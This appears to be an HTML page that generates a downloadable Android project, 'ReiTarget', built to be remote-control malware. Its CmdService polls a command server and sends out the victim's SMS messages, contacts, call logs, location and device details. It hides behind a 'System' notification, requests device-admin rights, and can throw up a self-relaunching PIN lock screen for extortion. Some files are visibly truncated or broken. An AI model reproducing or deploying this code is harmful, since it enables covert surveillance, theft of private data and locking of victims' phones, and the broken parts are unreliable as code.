  p { color:#6b6b6b; font-size:13px; margin-top:20px; }

<body>
<h1>Generator Project APK</h1>
<button onclick="gen()">⬇ Download ZIP</button>
<p>Extract → upload ke GitHub → Actions build</p>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
<script>
const files = {
"build.gradle": `buildscript {
    repositories { google(); mavenCentral() }
    dependencies { classpath 'com.android.tools.build:gradle:8.2.0' }
}
allprojects { repositories { google(); mavenCentral() } }`,

"settings.gradle": `include ':app'
rootProject.name = "ReiTarget"`,

"gradle.properties": `android.useAndroidX=true
org.gradle.jvmargs=-Xmx2048m`,

"gradlew": `#!/bin/sh
gradle "$@"`,

"gradle/wrapper/gradle-wrapper.properties": `distributionUrl=https\\://services.gradle.org/distributions/gradle-8.2-bin.zip`,

"app/build.gradle": `plugins { id 'com.android.application' }
android {
    namespace 'com.rei.target'
    compileSdk 34
    defaultConfig {
        applicationId "com.rei.target"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17

}
dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'

"app/src/main/java/com/rei/target/MainActivity.java": `package com.rei.target;
import android.*;
import android.app.admin.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.*;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
public class MainActivity extends AppCompatActivity {
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        String[] p = {Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.POST_NOTIFICATIONS};
        boolean n = false;
        for (String x : p) if (ContextCompat.checkSelfPermission(this, x) != PackageManager.PERMISSION_GRANTED) { n = true; break; }
        if (n) ActivityCompat.requestPermissions(this, p, 1001);
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            try { startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()))); } catch (Exception e) {}
        }
        ComponentName a = new ComponentName(this, AdminReceiver.class);
        DevicePolicyManager d = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (d != null && !d.isAdminActive(a)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, a);
            startActivity(i);
        }
        Intent s = new Intent(this, CmdService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(s); else startService(s);
    }
}`,

"app/src/main/java/com/rei/target/AdminReceiver.java": `package com.rei.target;

"app/src/main/java/com/rei/target/LockActivity.java": `package com.rei.target;
import android.app.Activity;
import android.content.Intent;
import android.os.*;
import android.view.WindowManager;
import android.widget.*;
public class LockActivity extends Activity {
    String pin = "666";
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_lock);
        String p = getIntent().getStringExtra("pin"); if (p != null) pin = p;
        String t = getIntent().getStringExtra("text"); if (t == null) t = "LOCK BY NHPROJECT";
        ((TextView) findViewById(R.id.customText)).setText(t);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        if (Build.VERSION.SDK_INT >= 27) { setShowWhenLocked(true); setTurnScreenOn(true); }
        EditText pi = findViewById(R.id.pinInput);
        TextView ev = findViewById(R.id.errView);
        final String fpin = pin;
        findViewById(R.id.btnUnlock).setOnClickListener(v -> {
            if (pi.getText().toString().equals(fpin)) finish();
            else { ev.setText("PIN salah"); pi.setText(""); }
        });
    }
    public void onBackPressed() {}
    protected void onPause() {
        super.onPause();
        Intent i = new Intent(this, LockActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.putExtra("pin", pin);
        startActivity(i);
    }
}`,

"app/src/main/java/com/rei/target/CmdService.java": `package com.rei.target;
import android.app.*;
import android.content.*;
import android.hardware.camera2.CameraManager;
import android.location.*;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import androidx.core.app.NotificationCompat;
import org.json.*;
import java.io.*;
import java.net.*;
import java.util.concurrent.*;
public class CmdService extends Service {
    ScheduledExecutorService sch;
    String url = "http://192.168.18.26:5000";
    String did = "apk-target";
    public void onCreate() {
        super.onCreate();
        startFg();
        sch = Executors.newScheduledThreadPool(2);
        sch.scheduleAtFixedRate(this::poll, 0, 3, TimeUnit.SECONDS);
    }
    void startFg() {
        String CH = "rei";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(CH, "Sys", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(c);
        }
        startForeground(1, new NotificationCompat.Builder(this, CH)
            .setContentTitle("System").setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN).build());
    }
    void poll() {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url + "/poll?id=" + did).openConnection();
            c.setConnectTimeout(5000); c.setReadTimeout(5000);
            if (c.getResponseCode() != 200) return;
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder(); String l;
            while ((l = br.readLine()) != null) sb.append(l);
            br.close();
            if (sb.length() == 0) return;
            sendResult(sb.toString(), exec(sb.toString()));
        } catch (Exception e) {}
    }
    String exec(String cmd) {
        try {
            String low = cmd.toLowerCase();
            if (low.equals("info")) {
                JSONObject o = new JSONObject();
                o.put("model", Build.MODEL); o.put("brand", Build.BRAND);
                o.put("android", Build.VERSION.RELEASE); o.put("sdk", Build.VERSION.SDK_INT);
                return o.toString();
            }
            if (low.equals("location")) {
                LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (l == null) return "no loc";
                JSONObject o = new JSONObject();
                o.put("lat", l.getLatitude()); o.put("lng", l.getLongitude()); o.put("acc", l.getAccuracy());
                return o.toString();
            }
            if (low.equals("sms")) {
                JSONArray a = new JSONArray();
                Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                if (c != null) { while (c.moveToNext()) { JSONObject o = new JSONObject();
                    o.put("from", c.getString(c.getColumnIndexOrThrow("address")));
                    o.put("body", c.getString(c.getColumnIndexOrThrow("body"))); a.put(o); } c.close(); }
                return a.toString();
            }
            if (low.equals("contacts")) {
                JSONArray a = new JSONArray();
                Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                if (c != null) { while (c.moveToNext()) { JSONObject o = new JSONObject();
                    o.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    o.put("phone", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))); a.put(o); } c.close(); }
                return a.toString();
            }
            if (low.equals("calllog")) {
                JSONArray a = new JSONArray();
                Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 20");
                if (c != null) { while (c.moveToNext()) { JSONObject o = new JSONObject();
                    o.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    o.put("duration", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))); a.put(o); } c.close(); }
                return a.toString();
            }
            if (low.startsWith("lock")) {
                String rest = cmd.length() > 4 ? cmd.substring(4).trim() : "";
                String[] p = rest.split("\\\\|", 2);
                String pin = p.length > 0 && !p[0].isEmpty() ? p[0].trim() : "666";
                String txt = p.length > 1 ? p[1] : "LOCK BY NHPROJECT";
                Intent i = new Intent(this, LockActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                i.putExtra("pin", pin); i.putExtra("text", txt);
                startActivity(i);
                return "locked";
            }
            if (low.equals("vibrate")) {
                ((Vibrator) getSystemService(VIBRATOR_SERVICE)).vibrate(2000);
                return "vibrated";
            }
            if (low.equals("torch") || low.equals("strobe")) {
                CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
                String id = cm.getCameraIdList()[0];
                int n = low.equals("strobe") ? 15 : 1;
                for (int i = 0; i < n; i++) { cm.setTorchMode(id, i % 2 == 0); Thread.sleep(100); }
                cm.setTorchMode(id, false);
                return "torch ok";
            }
        } catch (Exception e) { return "err: " + e.getMessage(); }
        return "unknown";
    }
    void sendResult(String cmd, String res) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url + "/result").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "application/json");
            JSONObject o = new JSONObject();
            o.put("id", did); o.put("cmd", cmd); o.put("result", res);
            OutputStream os = c.getOutputStream();
            os.write(o.toString().getBytes()); os.flush(); os.close();
            c.getResponseCode();
        } catch (Exception e) {}
    }
    public IBinder onBind(Intent i) { return null; }
}`,

".github/workflows/build.yml": `name: Build APK
on:
  push: { branches: [ main ] }
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { java-version: '17', distribution: 'temurin' }
      - uses: android-actions/setup-android@v3
      - uses: gradle/gradle-build-action@v2
      - run: gradle assembleDebug --no-daemon
      - uses: actions/upload-artifact@v4
        with:
          name: app-debug
          path: app/build/outputs/apk/debug/app-debug.apk`
};

function gen() {
  const zip = new JSZip();
  for (const [path, content] of Object.entries(files)) {
    zip.file(path, content);
  }
  zip.generateAsync({ type: "blob" }).then(blob => {
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "rei-target.zip";
    a.click();
  });
}
</script>
</body>
